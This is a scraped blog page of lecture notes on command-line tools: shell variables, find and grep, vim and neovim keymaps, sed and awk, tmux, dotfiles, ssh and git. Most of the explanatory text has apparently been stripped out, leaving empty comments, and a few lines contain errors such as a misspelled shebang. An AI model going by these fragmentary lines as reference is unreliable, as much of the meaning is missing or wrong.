class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exa  =&gt;  <span class="built_in">ls</span></span><br><span class="line">bat  =&gt;  <span class="built_in">cat</span> </span><br></pre></td></tr></table></figure><h4 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h4><p>shell, console, terminal?</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx</span><br></pre></td></tr></table></figure><h2 id="lectrue2-shell-script"><a href="#lectrue2-shell-script" class="headerlink" title="lectrue2: shell script"></a>lectrue2: shell script</h2><blockquote><p>Linux </p></blockquote><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$0</span>      </span><br><span class="line"><span class="variable">$1</span>-<span class="variable">$9</span>   </span><br><span class="line">$?       01</span><br><span class="line"><span class="variable">$_</span>      </span><br><span class="line"><span class="variable">$#</span>      </span><br><span class="line">$$      <span class="built_in">id</span></span><br><span class="line"><span class="variable">$@</span>      </span><br><span class="line"></span><br><span class="line">!!      </span><br><span class="line"><span class="comment"># </span></span><br><span class="line">foo=bar</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$foo</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">foo=$(<span class="built_in">pwd</span>)</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> xxx; <span class="keyword">do</span>... <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> xxx; then...fi</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># magic line </span></span><br><span class="line"><span class="comment">#   `shebang` </span></span><br><span class="line"><span class="comment">#!/usr/bin/pyton3</span></span><br></pre></td></tr></table></figure><p><code>man</code>  <code>tldr</code> (too long; dont read)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tldr tar</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">find .     <span class="comment"># .  `/` </span></span><br><span class="line">-name  <span class="comment"># ,</span></span><br><span class="line">-<span class="built_in">type</span>  <span class="comment">#  d(dir) f(file)</span></span><br><span class="line">-mtime -1 <span class="comment"># modify time 11</span></span><br><span class="line">-<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \;   <span class="comment">#  \; </span></span><br><span class="line"></span><br><span class="line">fd  <span class="comment"># find</span></span><br><span class="line"></span><br><span class="line">locate  <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">grep  <span class="comment"># </span></span><br><span class="line">-R  <span class="comment">#  </span></span><br><span class="line"></span><br><span class="line">rg  <span class="comment"># ripgrep</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">fzf</span><br><span class="line"></span><br><span class="line">zsh </span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tree</span><br><span class="line">broot</span><br></pre></td></tr></table></figure><h2 id="lecture3-editor-VIM"><a href="#lecture3-editor-VIM" class="headerlink" title="lecture3: editor VIM"></a>lecture3: editor VIM</h2><p>vim</p><ul><li>normal mode: </li><li>insert mode: </li><li>command mode: insert mode  <code>:</code> </li><li>visual mode: </li><li>replace mode</li></ul><p> insert mode</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">i   <span class="keyword">insert</span> </span><br><span class="line"><span class="keyword">a</span>   <span class="keyword">append</span></span><br><span class="line">I   </span><br><span class="line">A   </span><br><span class="line"><span class="keyword">o</span>    <span class="keyword">open</span> <span class="keyword">a</span> <span class="keyword">new</span> <span class="built_in">line</span></span><br><span class="line">O   </span><br></pre></td></tr></table></figure><p>normal mode</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esc  </span><br></pre></td></tr></table></figure><p></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- <span class="keyword">write</span> <span class="keyword">quit</span></span><br><span class="line"><span class="keyword">normal</span> <span class="keyword">mode</span>  :<span class="keyword">wq</span></span><br><span class="line"></span><br><span class="line">--  ! </span><br></pre></td></tr></table></figure><p>normal mode </p><ul><li><code></code>count</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">h   </span><br><span class="line"><span class="keyword">j</span>   </span><br><span class="line"><span class="keyword">k</span>   </span><br><span class="line"><span class="keyword">l</span>   </span><br><span class="line"></span><br><span class="line"><span class="keyword">w</span>   () word, </span><br><span class="line"><span class="keyword">b</span>   back word      back of word</span><br><span class="line"><span class="keyword">e</span>           end of word</span><br><span class="line"><span class="number">0</span>   </span><br><span class="line">$   </span><br><span class="line">^   </span><br><span class="line"></span><br><span class="line">ctrl-<span class="keyword">u</span>     <span class="keyword">up</span></span><br><span class="line">ctrl-d     down </span><br><span class="line"></span><br><span class="line">H  highest  </span><br><span class="line">L  low      </span><br><span class="line">M  mid      </span><br></pre></td></tr></table></figure><p></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">d  ,</span><br><span class="line">dd <span class="keyword">p</span></span><br><span class="line">D </span><br><span class="line">d1G </span><br><span class="line">dG  </span><br><span class="line">n1, n2d n1-n2</span><br><span class="line">--  <span class="keyword">a</span> around;  i inside</span><br><span class="line"><span class="keyword">di</span>(  </span><br><span class="line">da(  </span><br><span class="line"><span class="keyword">c</span>   <span class="keyword">change</span> <span class="keyword">a</span> word (d )<span class="keyword">insert</span> <span class="keyword">mode</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">x</span>   </span><br><span class="line"><span class="symbol">&lt;num&gt;</span><span class="keyword">x</span> num</span><br><span class="line">s   <span class="keyword">insert</span> <span class="keyword">mode</span></span><br><span class="line">S   <span class="keyword">insert</span> <span class="keyword">mode</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">y</span>   <span class="keyword">yank</span> </span><br><span class="line">yy </span><br><span class="line">y1G ...</span><br><span class="line"><span class="keyword">p</span>   paste</span><br><span class="line"><span class="keyword">P</span>   </span><br></pre></td></tr></table></figure><p></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">g</span><br><span class="line">gg </span><br><span class="line">G   </span><br><span class="line"><span class="symbol">&lt;num&gt;</span>G  num</span><br><span class="line">:<span class="symbol">&lt;num&gt;</span>   num</span><br></pre></td></tr></table></figure><p></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">u</span> <span class="keyword">undo</span></span><br><span class="line">ctrl + r   <span class="keyword">redo</span> </span><br></pre></td></tr></table></figure><p>visual mode: </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v   v</span><br><span class="line">V    V</span><br><span class="line">ctrl+v   ctrl+v</span><br></pre></td></tr></table></figure><p></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">f</span><span class="symbol">&lt;word&gt;</span>  </span><br><span class="line">/<span class="symbol">&lt;word&gt;</span>  ,</span><br><span class="line">n       <span class="keyword">next</span></span><br><span class="line"><span class="keyword">N</span>      </span><br></pre></td></tr></table></figure><p></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:<span class="keyword">set</span> <span class="keyword">nu</span>   </span><br></pre></td></tr></table></figure><p><code>~</code> </p><p></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%   </span><br></pre></td></tr></table></figure><p>tab, window, buffer</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tab:  vimtab</span><br><span class="line"></span><br><span class="line">window: vim </span><br><span class="line"></span><br><span class="line">buffer: buffer, buffer,</span><br></pre></td></tr></table></figure><p>vim  <code>~/.vimrc</code> </p><ul><li>DIY</li><li></li></ul><h3 id="neovim"><a href="#neovim" class="headerlink" title="neovim"></a>neovim</h3><p><del></del>(IDE) <a href="https://neovim.io/">neovim</a>  <a href="https://www.lazyvim.org/">LazyVim</a>DIY.  <code>VsCode</code> neovim</p><ul><li>vimneovim</li></ul><h4 id="keymap"><a href="#keymap" class="headerlink" title="keymap"></a>keymap</h4><p>Leader  space , </p><p></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>ft   </span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fT   /</span><br><span class="line"></span><br><span class="line">ctrl-/    </span><br></pre></td></tr></table></figure><p></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>gc     LSP</span><br></pre></td></tr></table></figure><p>(buffer)</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>bb</span><br></pre></td></tr></table></figure><p> telescope</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- </span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="symbol">&lt;leader&gt;</span>   <span class="symbol">&lt;esc&gt;</span><span class="symbol">&lt;esc&gt;</span> </span><br><span class="line"></span><br><span class="line">-- </span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">sb</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;c-s&gt;</span> </span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fn  <span class="keyword">new</span> <span class="keyword">file</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">w</span>|  <span class="symbol">&lt;leader&gt;</span>|  </span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">w</span>-  <span class="symbol">&lt;leader&gt;</span>-  </span><br><span class="line"></span><br><span class="line">-- <span class="keyword">normal</span> <span class="keyword">mode</span> </span><br><span class="line"><span class="symbol">&lt;C-h&gt;</span> </span><br><span class="line"><span class="symbol">&lt;C-j&gt;</span> </span><br><span class="line"><span class="symbol">&lt;C-k&gt;</span> </span><br><span class="line"><span class="symbol">&lt;C-l&gt;</span> </span><br></pre></td></tr></table></figure><p> neo-tree</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>fe   </span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fE   /</span><br><span class="line"></span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">e</span>   </span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>E   /</span><br><span class="line"></span><br><span class="line">-- </span><br><span class="line"><span class="symbol">&lt;C-h&gt;</span> </span><br><span class="line"><span class="symbol">&lt;C-l&gt;</span> </span><br></pre></td></tr></table></figure><p>lazy.nvim </p><h2 id="lecture4-data-wrangling"><a href="#lecture4-data-wrangling" class="headerlink" title="lecture4: data wrangling"></a>lecture4: data wrangling</h2><blockquote><p></p></blockquote><p>grep</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;word&quot;</span> tmp.txt   <span class="comment"># </span></span><br><span class="line">-R  <span class="comment"># </span></span><br></pre></td></tr></table></figure><p>sed</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/&lt;pattern&gt;/&lt;replace&gt;/&#x27;</span></span><br><span class="line">pattern: </span><br><span class="line">replace: pattern  replace \num num</span><br><span class="line"></span><br><span class="line"><span class="comment"># sed  `-E` </span></span><br></pre></td></tr></table></figure><p>regular expression</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[0-9]   0,1,2...9 </span><br><span class="line">*       1</span><br><span class="line">?       0  1 </span><br><span class="line">.       </span><br><span class="line">()      </span><br><span class="line">^    $ </span><br></pre></td></tr></table></figure><p>wc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wc</span> -l    word count, -l line </span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sort</span>    </span><br><span class="line">-n </span><br><span class="line">-k </span><br><span class="line"><span class="built_in">uniq</span>    </span><br><span class="line">-c  </span><br></pre></td></tr></table></figure><p>awk</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;script&#x27;</span>  </span><br><span class="line">awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">-F  </span><br></pre></td></tr></table></figure><p>cutsplit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cut</span> [option] filename</span><br><span class="line">-d     </span><br><span class="line"><span class="built_in">cut</span> -d 3    -d 3-9,12  3-9,12</span><br><span class="line">-f   fields -d</span><br><span class="line"><span class="built_in">cut</span> -d : -f2  1-2</span><br><span class="line">-c   character </span><br><span class="line">-b   </span><br></pre></td></tr></table></figure><p>? ? </p><h2 id="lecture5-command-line-environment"><a href="#lecture5-command-line-environment" class="headerlink" title="lecture5: command-line environment"></a>lecture5: command-line environment</h2><blockquote><p></p></blockquote><h3 id="job-control"><a href="#job-control" class="headerlink" title="job control"></a>job control</h3><p>Linux  signal</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">man signal : number  name</span><br><span class="line"></span><br><span class="line">ctrl-c   SIGINT   signal interrupt</span><br><span class="line">ctrl-\   SIGQUIT</span><br></pre></td></tr></table></figure><p>ctrl+z</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">&amp;     </span><br><span class="line"><span class="built_in">jobs</span>   pid</span><br><span class="line"><span class="built_in">fg</span> %num / <span class="built_in">bg</span> %num  <span class="built_in">fg</span> <span class="built_in">bg</span> front back ground</span><br><span class="line"><span class="built_in">kill</span> %num            </span><br></pre></td></tr></table></figure><h3 id="terminal-multiplexers"><a href="#terminal-multiplexers" class="headerlink" title="terminal multiplexers"></a>terminal multiplexers</h3><ul><li><p>terminal window</p></li><li><p> <code>tmux</code></p><ul><li> kill session</li><li>ssh </li></ul></li><li><p>session, window, pune</p><ul><li>tmux, session, </li><li>window shell </li><li>pune </li></ul></li></ul><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tmux</span><br><span class="line">session window1 windiow2...     </span><br><span class="line"></span><br><span class="line">tmux a   <span class="comment"># attach session</span></span><br><span class="line">-t name  </span><br><span class="line"></span><br><span class="line">tmux new -t &lt;name&gt;       </span><br><span class="line">tmux kill-session -t &lt;num/name&gt;  session</span><br><span class="line"></span><br><span class="line">tmux <span class="built_in">ls</span>   session</span><br><span class="line"></span><br><span class="line">tmux splitw -h/-v   pane window</span><br></pre></td></tr></table></figure><p> <code>ctrl-b</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">prefix = Ctrl-b</span><br><span class="line"><span class="comment"># session prefix keymap</span></span><br><span class="line">prefix d   dettach session</span><br><span class="line">prefix s   session vim</span><br><span class="line"></span><br><span class="line"><span class="comment"># window</span></span><br><span class="line">prefix c   create a new window</span><br><span class="line">prefix p   previous window</span><br><span class="line">prefix n   next window</span><br><span class="line">prefix &lt;n&gt; n,n</span><br><span class="line">prefix w   window  session(s ?),  jk enter</span><br><span class="line">prefix ,   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pune</span></span><br><span class="line">prefix x       pune</span><br><span class="line">prefix %       </span><br><span class="line">prefix <span class="string">&quot;       </span></span><br><span class="line"><span class="string">prefix     pune</span></span><br><span class="line"><span class="string">prefix x       pune</span></span><br><span class="line"><span class="string">prefix z       </span></span><br><span class="line"><span class="string">prefix !       pune window</span></span><br><span class="line"><span class="string">prefix   pune</span></span><br></pre></td></tr></table></figure><p> <code>~/.tmux.conf</code> <a href="https://www.debugpointer.com/linux/tmux-conf">tmux-conf</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctrl-b ctrl-a qemuctrl-x</span><br><span class="line"></span><br><span class="line">prefix I             install plugins</span><br><span class="line">prefix alt I         uninstall</span><br><span class="line"></span><br><span class="line">alt + pune </span><br></pre></td></tr></table></figure><ul><li> <a href="https://github.com/tmux-plugins/tpm">Tmux Plugin Manager</a></li><li>+ <a href="https://github.com/rothgar/awesome-tmux#themes">awesome-tmux: A list of awesome resources for tmux</a></li></ul><h3 id="aliases"><a href="#aliases" class="headerlink" title="aliases"></a>aliases</h3><p> </p><ul><li>bash <code>~/.bashrc</code> </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  ll = &#x27;ls -l&#x27; shell script</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -alF&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> la=<span class="string">&#x27;ls -A&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> l=<span class="string">&#x27;ls -CF&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="dotfiles"><a href="#dotfiles" class="headerlink" title="dotfiles"></a>dotfiles</h3><p></p><ul><li>bash -&gt; <code>~/.bashrc</code></li><li>zsh -&gt; <code>~/.zshrc</code>zsh</li><li>vim -&gt; <code>~/.vimrc</code></li><li>tmux -&gt; <code>~/tmux.conf</code></li><li>neovim -&gt; <code>~/.config/nvim</code>  <code>lua</code> </li><li>ssh -&gt; <code>~/.ssh</code> <ul><li> <code>ssh-keygen</code> </li><li> <code>authorized_keys</code><code>600</code></li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id -i ~/.ssh/id_rsa.pub &lt;username&gt;@&lt;IP&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ssh  scp  cp</span></span><br><span class="line">scp tmp.txt &lt;user&gt;@&lt;IP&gt;:/tmp</span><br></pre></td></tr></table></figure><p> <a href="https://nixos.org/">NixOS</a>, </p><p> github  <code>clone/fork</code> </p><p>bash  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS1=<span class="string">&quot;user&gt;&quot;</span>   shell </span><br></pre></td></tr></table></figure><blockquote><p>tmux</p></blockquote><p> <code>prefix</code> </p><h2 id="lecture6-virsion-control-git"><a href="#lecture6-virsion-control-git" class="headerlink" title="lecture6: virsion control(git)"></a>lecture6: virsion control(git)</h2><blockquote><p>git</p></blockquote><p>git</p><ul><li>git <ul><li>root<code>tree</code>, <code>blob</code></li><li>commit: commit  <code>snapshot()</code>()</li><li> <code>mapping&lt;string, object&gt;</code> .string(SHA-1)object(snapshot)commithash</li></ul></li><li>reference: git <code>mapping&lt;string, string&gt;</code> hash</li><li>git  <a href="https://www.bilibili.com/video/BV1r3411F7kn/?spm_id_from=333.337.search-card.all.click&vd_source=ccaa27461534d3a4a5e9b964672f86d6">Git</a><ul><li></li><li></li><li></li><li></li></ul></li></ul><p>git </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">git config --global user.name <span class="string">&quot;your name&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;your email&quot;</span></span><br></pre></td></tr></table></figure><p>git</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> demo</span><br><span class="line"><span class="built_in">cd</span> demo</span><br><span class="line"></span><br><span class="line">git init   <span class="comment">#  `.git` </span></span><br><span class="line"></span><br><span class="line">git status <span class="comment"># </span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># oneline </span></span><br><span class="line">git <span class="built_in">log</span> --all --graph --decorate --oneline</span><br></pre></td></tr></table></figure><p> <code>HEAD</code> </p><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  gitignore </span></span><br><span class="line"><span class="built_in">touch</span> .gitignore</span><br><span class="line"></span><br><span class="line">*.jpg   <span class="comment">#  jpg</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> &gt; readme.md  <span class="comment"># untracked git status </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">git add readme.txt       <span class="comment"># tracked </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">git commit  <span class="comment"># </span></span><br><span class="line">-m <span class="string">&quot;message&quot;</span>  <span class="comment"># message </span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. clone</span></span><br><span class="line">git <span class="built_in">clone</span> <span class="string">&quot;your-repo&quot;</span></span><br><span class="line">git remote -v   <span class="comment"># </span></span><br><span class="line">git push        <span class="comment"># .git</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. git</span></span><br><span class="line"><span class="comment">## </span></span><br><span class="line"><span class="comment">## </span></span><br><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit</span><br><span class="line">git remote add <span class="string">&quot;name&quot;</span> git@&lt;your-repo&gt;  <span class="comment"># </span></span><br><span class="line"><span class="comment"># name </span></span><br><span class="line"></span><br><span class="line"><span class="comment">## mastermain(main) `git checkout -b main`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## </span></span><br><span class="line">git push <span class="string">&quot;&quot;</span> <span class="string">&quot;&quot;</span>:<span class="string">&quot;&quot;</span>   <span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="comment">## </span></span><br><span class="line">git remote <span class="built_in">rm</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line"><span class="comment"># pull 